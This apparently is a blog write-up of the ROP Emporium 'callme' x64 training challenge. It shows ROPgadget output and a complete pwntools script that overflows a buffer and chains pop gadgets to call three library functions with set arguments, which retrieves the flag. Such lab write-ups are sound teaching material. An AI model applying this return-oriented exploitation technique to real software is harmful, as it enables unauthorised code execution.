---
title: ROP Emporium - callme (x64) - writeup
date: 2023-03-15 00:27:03 +0100
author: farrimwildaxe
categories: [Writeup,ROP Emporium]
tags: [rop,emporium,x64,callme,writeup,pwntools]
img_path: /assets/img/ropemporium/callme
published: true
---


In this task we need to call three functions: `callme_one`, `callme_two` and `callme_three` in exact order, also with proper function arguments. As mentioned on the challenge page, x86_64 binary uses doubled arguments: `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d` . Let’s do it!

As I mentioned in the split writeup, Linux and other Unix-like systems store first six function arguments in the following registers: **RDI, RSI, RDX, RCX, R8, R9**. Because we’re going to use three parameters we should focus on pop/ret ROP Gadgets operating on RDI, RSI, and RDX:

```python
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/callme]
└─$ [2023-03-14 23:59:42] ROPgadget --binary ./callme --only "pop|ret"                                                                                                                                                                
Gadgets information
============================================================
0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009a0 : pop r14 ; pop r15 ; ret
0x00000000004009a2 : pop r15 ; ret
0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
0x000000000040093e : pop rdx ; ret
0x00000000004009a1 : pop rsi ; pop r15 ; ret
0x000000000040093d : pop rsi ; pop rdx ; ret
0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006be : ret

Unique gadgets found: 14
```

OK, so RDI, and RDX are easy ones: `0x00000000004009a3 : pop rdi ; ret` and `0x000000000040093e : pop rdx ; ret`, but RSI looks like a bit tricky one. From the three gadgets this: `0x00000000004009a1 : pop rsi ; pop r15 ; ret`seems to be the easiest one to use, we just need to put two values on the stack instead of one (to fill unused by us r15 register). So, let’s make a python function which will prepare function arguments based on ROP gadgets we’re going to use:

```python
def prepare_args():
    stack  = p64(0x0004009a3)           # pop rdi ; ret
    stack += p64(0xdeadbeefdeadbeef)
    stack += p64(0x0004009a1)           # pop rsi ; pop r15 ; ret
    stack += p64(0xcafebabecafebabe)
    stack += p64(0x0)                   # r15 (unused)
    stack += p64(0x00040093e)           # pop rdx ; ret
    stack += p64(0xd00df00dd00df00d)
    return stack
```

Next, because `callme_` functions are placed in `libcallme.so` library we need to use PLT to get their adresses (as mentioned on challenge page). We can use pwntools functionality for that. Putting it all together, our exploit looks like this:

```python
from pwn import *

context.log_level="debug"

elf = context.binary = ELF("callme")

gs = '''
break main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def prepare_args():
    stack  = p64(0x0004009a3)           # pop rdi ; ret
    stack += p64(0xdeadbeefdeadbeef)
    stack += p64(0x0004009a1)           # pop rsi ; pop r15 ; ret
    stack += p64(0xcafebabecafebabe)
    stack += p64(0x0)                   # r15 (unused)
    stack += p64(0x00040093e)           # pop rdx ; ret
    stack += p64(0xd00df00dd00df00d)
    return stack

io = start()
io.recvuntil(b"> ")

payload  = b"A" * 40 
payload += prepare_args()
payload += p64(elf.plt.callme_one)
payload += prepare_args()
payload += p64(elf.plt.callme_two)
payload += prepare_args()
payload += p64(elf.plt.callme_three)

io.sendline(payload)

io.interactive()
```

Let’s run it:

![callme - output of the exploit](callme-output.png)

Bingo, we’ve got the flag!